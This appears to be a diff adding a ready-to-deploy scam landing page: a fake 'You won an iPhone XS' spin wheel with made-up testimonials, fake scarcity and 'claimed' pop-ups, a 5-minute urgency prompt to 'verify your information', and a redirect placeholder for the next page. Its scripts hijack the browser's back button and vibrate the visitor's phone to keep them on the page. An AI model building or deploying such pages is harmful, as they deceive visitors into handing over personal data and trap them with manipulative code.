@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <base href="">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Are you lucky?</title>
+    <link rel="stylesheet" type="text/css" href="css/sweetalert.css">
+    <link rel="stylesheet" type="text/css" href="css/index.css" media="all">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+	<script> var lang_locale = "en"; </script>	
+    <script src="js/dtime.js"></script>
+    <script>
+        function getURLParameter(name) {
+          var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+          var r = window.location.search.substr(1).match(reg);
+          if (r != null) {
+              return unescape(r[2]);
+          };
+          return null;
+        }
+      </script>
+    <script type="text/javascript">
+        navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+        navigator.vibrate([1000, 500, 1000]);
+    </script>
+</head>
+
+<body onload="spinnerAction()" class=" stop-scrolling">
+    <script type="text/javascript">
+        (function(window, location) {
+            var url_with_variables = location.href;
+            history.replaceState(null, document.title, location.pathname + location.search + "#!/back");
+            history.pushState(null, document.title, location.pathname + location.search);
+            window.addEventListener("popstate", function() {
+                if (location.hash === "#!/back") {
+                    history.replaceState(null, document.title, location.pathname + location.search);
+                    setTimeout(function() {
+                        location.replace(url_with_variables);
+                    }, 0);
+                }
+            }, false);
+        }(window, location));
+    </script>
+    <script src="js/sweetalert-dev.js"></script>
+    <script type="text/javascript">
+        var spinnerAction = function() {
+            function spin3() {
+                DisableExitTraffic();
+                window.location.href = "https://www.google.com";// change redirect url
+            }
+
+            function spin2point5() {
+                var spinWin = document.getElementById("spin")
+                console.log("success");
+                spinWin.className = spinWin.className + " spinAround2";
+                setTimeout(function() {
+                    spinWin.className = spinWin.className + " Op";
+                }, 6600);
+                setTimeout(function() {
+                    iphone.style.display = "block";
+                }, 7000);
+                setTimeout(function() {
+  
+                    var luckNum = "LAZ";
+                    for (var l = 0; l < 4; l++) {
+                        luckNum = luckNum + Math.floor(Math.random() * 10);
+                    }
+                     
+                    swal({
+                        title: "Congratulations!",
+                        text: "You have won an iPhone XS!\n\nPlease HURRY! You have 5 minutes to claim it!\n\nVerify your information on the next page to continue.",
+                        type: "success"
+                    }, spin3);
+
+                    function closeAlert() {
+                        swal.close();
+                        spin3();
+                    };
+                    document.getElementsByClassName("sweet-alert")[0].onclick = closeAlert;
+                    document.getElementsByClassName("sweet-overlay")[0].onclick = closeAlert;
+                }, 8000);
+            }
+
+            function spin2() {
+                var spinWin = document.getElementById("spin")
+                if (false) {} else {
+                    spinWin.addEventListener("animationstart", function() {
+                        console.log('animationstart');
+                    }, false);
+                    spinWin.className = spinWin.className + "spinAround";
+                    setTimeout(function() {
+                         swal({
+                            title: "Good Luck",
+                            text: "You got (1) Extra Spin!",
+                            type: "success"
+                        }, spin2point5);
+
+                        function closeAlert() {
+                            swal.close();
+                            spin2point5();
+                        };
+                        document.getElementsByClassName("sweet-alert")[0].onclick = closeAlert;
+                        document.getElementsByClassName("sweet-overlay")[0].onclick = closeAlert;
+                    }, 6500);
+                }
+            }
+            swal({
+                title: "YOU ARE THE CHOSEN!",
+                text: "We are giving out FREE GIFT! Press 'SPIN' and see if you win!",
+                imageUrl: './images/win.png'
+            });
+
+            function closeAlert() {
+                swal.close();
+                spin2();
+            };
+            document.getElementsByClassName("sweet-alert")[0].onclick = closeAlert;
+            document.getElementsByClassName("sweet-overlay")[0].onclick = closeAlert;
+        };
+    </script>
+    <div id="a-nav">
+        <h1>Congratulations!<script>
+            document.write(
+              getURLParameter("pcity") || getURLParameter("pcountry")
+            );
+          </script> user</h1>
+        <div class="icon-basket"></div>
+    </div>
+    <main>
+        <div class="content">
+            <div class="main-content" id="content1">
+                <div class="toptext" style="font-size:small;">
+                    <table>
+                        <tbody>
+                            <tr>
+                                <th valign="bottom"><b><font color="#3c599b">Congrats, You're A Lucky Visitor!</font></b>
+                                </th>
+                            </tr>
+                            <tr>
+                                <td valign="top"><font size="2px" color="#9fa2a6"><script>dtime(-1,true)</script> </font>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                <center>
+                    <h2><script>
+                        document.write(
+                          getURLParameter("pcity") || getURLParameter("pcountry")
+                        );
+                      </script> user, You have been specially selected to win a special prize from us!</h2>
+                </center>
+                <center>We will award <span id="count">30</span> free items, and you can have chance to get one of them!</center>
+                <div id="spinner"> <img id="spinBG" src="images/11.png"> <img id="spin" src="images/650wheel.png"> <img onclick="startSpin()" id="win" src="images/33.png"> <img id="iphone" class="animated rotateIn" src="images/650_4.png"> </div>
+                <br>
+                <hr>
+                <hr>
+                <p style="color: rgb(168, 167, 167);"> <span style="color: rgb(168, 167, 167); cursor: pointer;" onclick="total_likes();return false" id="liked">Like</span> - Comment - Share </p>
+                <hr>
+                 
+                <div class="comments">
+                    <p style="margin: 0px; padding: 0px;" id="total_likes"><span style="color: rgb(59, 89, 152);">12,068</span> likes this</p>
+                </div>
+                <div class="comments">
+                    <p style="margin: 0px; padding: 0px; float: left; display: block; width: 50%;"><span style="color: rgb(59, 89, 152);">View Comments</span>
+                    </p>
+                    <p style="margin: 0px; padding: 0px; float: right; display: block; width: 50%; color: rgb(168, 167, 167); text-align: right;">50 of 80,312</p>
+                    <div style="clear: both;"></div>
+                </div>
+                 
+                <div id="cmntspst">
+                    <div class="comments">
+                        <div class="comment-content pic8">
+                            <p class="name">Phil Graham</p>
+                            <p> Initially I was not sure if this is real or not, but I have received iPhone today :D!!</p>
+                        </div>
+                        <div class="clr"></div>
+                        <div class="comment-status"><span>Reply - Like - 54 Likes</span> -
+                            <script type="text/javascript">
+                                dtime(-1);
+                            </script> </div>
+                    </div>
+                    <div>
+                        <div class="comments">
+                            <div class="comment-content" style="background:url(images/6.jpg) no-repeat scroll 0 0 transparent">
+                                <p class="name">Holly Anderson</p>
+                                <p>Fantastic! I've never won anything before, but I hope I will be as lucky!!
+                                    <br>
+                                </p>
+                            </div>
+                            <div class="clr"></div>
+                            <div class="comment-status"><span>Reply - Like - 0 Likes</span> - Now</div>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="comments">
+                            <div class="comment-content" style="background:url(images/7.jpg) no-repeat scroll 0 0 transparent">
+                                <p class="name">Sean Anthony</p>
+                                <p>Really, really happy. What a great way to start my weekend
+                                    <br>
+                                </p>
+                            </div>
+                            <div class="clr"></div>
+                            <div class="comment-status"><span>Reply - Like - 0 Likes</span> - Now</div>
+                        </div>
+                    </div>
+                </div>
+                 
+                <div class="comments">
+                    <div class="comment-content pic7">
+                        <p class="name">Victoria Johnson</p>
+                        <p>Samsung Edge have come through the post today! Thanks to Inc. !! </p>
+                    </div>
+                    <div class="clr"></div>
+                    <div class="comment-status"><span>Reply - Like - 87 Likes</span> -
+                        <script type="text/javascript">
+                            dtime(-1);
+                        </script> </div>
+                </div>
+                
+                 
+                <div class="comments">
+                    <div class="comment-content pic9">
+                        <p class="name">Mike Hines</p>
+                        <p>At first I thought this was just a joke, but the iPhone XS was arrived by the mail this morning! lol
+                            <br>
+                        </p>
+                    </div>
+                    <div class="clr"></div>
+                    <div class="comment-status"><span>Reply - Like - 10 Likes</span> -
+                        <script type="text/javascript">
+                            dtime(1);
+                        </script> </div>
+                </div>
+                 
+                <div class="comments">
+                    <div class="comment-content pic10">
+                        <p class="name">Sandra Moore</p>
+                        <p>Sweeeet! I won iPhone XS !! My gosh!</p>
+                    </div>
+                    <div class="clr"></div>
+                    <div class="comment-status"><span>Reply - Like - 45 Likes</span> -
+                        <script type="text/javascript">
+                            dtime(1);
+                        </script> </div>
+                </div>
+                 
+                <div class="comments">
+                    <div class="comment-content pic11">
+                        <p class="name">Tom Rise</p>
+                        <p>Thank god I try to play it again! I win the camera iPhone XS!
+                            <br>
+                        </p>
+                    </div>
+                    <div class="clr"></div>
+                    <div class="comment-status"><span>Reply - Like - 3 Likes</span> -
+                        <script type="text/javascript">
+                            dtime(2);
+                        </script></div>
+                </div>
+                 
+            </div>
+        </div>
+    </main>
+    <style>
+        .notij-close,
+        div.notij-que * {
+            font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
+            z-index: 100000000
+        }
+        div.notij-que {
+            position: fixed;
+            width: 250px;
+            right: 10px;
+            bottom: 10px
+        }
+        div.notij {
+            font-size: 12px;
+            color: #555;
+            display: none;
+            padding: 10px;
+            position: relative;
+            margin-bottom: 5px;
+            -webkit-border-radius: 5px;
+            -moz-border-radius: 5px;
+            border-radius: 5px;
+            line-height: 10px;
+        }
+        div.notij-msg {
+            padding-right: 20px;
+            font-size: 12px;
+            color: #FFF
+        }
+        .notij-close {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            cursor: pointer;
+            font-weight: 800
+        }
+        .theme_default {
+            background: #414141
+        }
+        .close_default {
+            color: #999
+        }
+        .theme_error {
+            background: #F33
+        }
+        .close_error {
+            color: #FFEDFD
+        }
+        .theme_info {
+            background: #09F
+        }
+        .close_info {
+            color: #3CF
+        }
+        @media (min-width: 780px) {
+            div.notij-que {
+                width: 400px;
+            }
+            div.notij,
+            div.notij-msg {
+                font-size: 12px;
+            }
+        }
+        .cta {
+            background: #F0AD4E;
+            border: 2px solid #fff;
+            padding: 6px;
+            -ms-border-radius: 10px;
+            -o-border-radius: 10px;
+            -moz-border-radius: 10px;
+            -webkit-border-radius: 10px;
+            border-radius: 10px;
+            color: #000
+        }
+        .notij-que {
+            z-index: 10000000000000;
+        }
+    </style>
+    <div class="sweet-overlay" tabindex="-1" style="opacity: 1.02; display: block;"></div>
+    <div class="sweet-alert showSweetAlert visible" data-custom-class="" data-has-cancel-button="false" data-has-confirm-button="true" data-allow-outside-click="false" data-has-done-function="false" data-animation="pop" data-timer="null" style="display: block; margin-top: -153px;">
+        <div class="FBTITLE"><img>YOU ARE THE CHOSEN!
+            <!-- <span style="cursor: pointer; float: right;">✖</span> -->
+        </div>
+        <div class="sa-icon sa-error" style="display: none;"> <span class="sa-x-mark">
+					<span class="sa-line sa-left"></span> <span class="sa-line sa-right"></span> </span>
+        </div>
+        <div class="sa-icon sa-warning" style="display: none;"> <span class="sa-body"></span> <span class="sa-dot"></span> </div>
+        <div class="sa-icon sa-info" style="display: none;"></div>
+        <div class="sa-icon sa-success" style="display: none;"> <span class="sa-line sa-tip"></span> <span class="sa-line sa-long"></span>
+            <div class="sa-placeholder"></div>
+            <div class="sa-fix"></div>
+        </div>
+        <div class="sa-icon sa-custom" style="display: block; background-image: url(./images/win.png); width: 80px; height: 80px;width:80px; height:80px"></div>
+        <h2>YOU ARE THE CHOSEN!</h2>
+        <p style="display: block;">We are giving out FREE GIFT! Press 'SPIN' and see if you win!</p>
+        <fieldset>
+            <input type="text" tabindex="3" placeholder="">
+            <div class="sa-input-error"></div>
+        </fieldset>
+        <div class="sa-error-container">
+            <div class="icon">!</div>
+            <p>Not valid!</p>
+        </div>
+        <div class="sa-button-container">
+            <button class="cancel" tabindex="2" style="display: none;">Cancel</button>
+            <div class="sa-confirm-button-container">
+                <button class="confirm" tabindex="1" style="display: inline-block; background-color: rgb(140, 212, 245); box-shadow: rgba(140, 212, 245, 0.8) 0px 0px 2px, rgba(0, 0, 0, 0.0470588) 0px 0px 0px 1px inset;">OK</button>
+                <div class="la-ball-fall">
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="notij-que"></div>
+    <div class="notij-que" id="notij-que">
+        <div class="notij theme_error" style="opacity: 1.0024999999999997; display: block;">
+            <div class="notij-msg">Only 6 Gifts left!</div>
+        </div>
+        <div class="notij theme_info" style="opacity: 1.0024999999999997; display: block;">
+            <div class="notij-msg">Sean Anthony added comment</div>
+        </div>
+    </div>
+    <script type="text/javascript">
+        function DisableExitTraffic() {
+            PreventExitSplash = true;
+        }
+
+        function fadeIn(el) {
+            el.style.opacity = 0;
+            el.style.display = "block";
+            var last = +new Date();
+            var tick = function() {
+                el.style.opacity = +el.style.opacity + (new Date() - last) / 400;
+                last = +new Date();
+                if (+el.style.opacity < 1) {
+                    (window.requestAnimationFrame && requestAnimationFrame(tick)) || setTimeout(tick, 16);
+                }
+            };
+            tick();
+        }
+
+        function alerts(text, autoclose, theme) {
+            var elems = document.createElement('div');
+            elems.style.opacity = 0;
+            elems.innerHTML = text;
+            elems.className += "notij"
+            if (theme == "red") {
+                elems.className += " theme_error";
+            }
+            if (theme == "blue") {
+                elems.className += " theme_info";
+            }
+            document.getElementById("notij-que").appendChild(elems);
+            var d = document.createElement('div');
+            d.className += "notij-msg";
+            d.innerHTML = elems.innerHTML;
+            elems.innerHTML = "";
+            elems.appendChild(d);
+            fadeIn(elems);
+            setTimeout(function() {
+                elems.style.display = "none";
+                document.getElementById("notij-que").removeChild(elems);
+            }, autoclose);
+        }
+        setTimeout(function() {
+            alerts("Only 6 Gifts left!", 2500, "red");
+        }, 1000);  
+        setTimeout(function() {
+            alerts("Jane Browns has claimed a iPhone XS!", 5000, "blue");
+        }, 5000);
+        setTimeout(function() {
+            alerts("Only 6 Gifts left!", 5000, "red");
+        }, 12000);
+
+        function comment(text, name, pic, time_wait) {
+			var d = document.createElement('div');
+			d.innerHTML = '<div class="comments"><div class="comment-content"><p class="name">' + name + '</p><p>' + text + '<br></p></div><div class="clr"></div><div class="comment-status"><span>Reply - Like - 0 Likes</span> - Now</div></div>   ';
+			setTimeout(function() {
+				document.getElementById("cmntspst").insertBefore(d, document.getElementById("cmntspst").firstChild);
+				alerts(name + " added comment", 2000, "blue");
+			}, time_wait);
+        }
+        // comment("Fantastic! I've never won anything before, but I hope I will be as lucky!!", "Holly Anderson", "./images/6.jpg", 7000);
+        // comment("Really, really happy. What a great way to start my weekend", "Sean Anthony", "./images/7.jpg", 12000);
+     
+        ! function() {
+            var t;
+            try {
+                for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+                onpopstate = function(t) {
+                    t.state && location.replace("#");
+                }
+            } catch (o) {}
+        }();
+    </script>
+</body>
+
+</html>
